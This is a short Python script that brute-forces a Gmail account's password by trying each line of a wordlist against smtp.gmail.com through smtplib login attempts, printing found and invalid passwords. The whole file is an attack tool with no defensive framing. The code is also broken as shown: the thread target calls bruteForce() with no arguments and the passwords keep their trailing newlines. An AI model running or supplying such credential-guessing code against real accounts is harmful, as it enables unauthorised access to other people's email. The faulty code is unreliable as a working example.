#!/usr/bin/env python3

import smtplib
import threading
import sys

threadLock = threading.Lock()
threads = []

def bruteForce(email, wordlist):
    with open(wordlist) as file:
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.ehlo()
            server.starttls()
            try:
                for password in file:
                    try:
                        server.login(email, password)
                        threadLock.acquire()
                        print(f"\n\033[92mPassword is: \033[0m{password.strip()}")
                        threadLock.release()
                    except smtplib.SMTPAuthenticationError:
                        threadLock.acquire()
                        print("\033[91mInvalid Password: \033[0m{}".format(password.strip()))
                        threadLock.release()
                        continue
                    except smtplib.SMTPServerDisconnected:
                        continue
            except KeyboardInterrupt:
                print("")
                sys.exit()
        except:
            pass

if __name__ == '__main__':
    t = threading.Thread(target=bruteForce())
    threads.append(t)
    t.start()

    for i in threads:
        i.join()
    print("\nDone!")
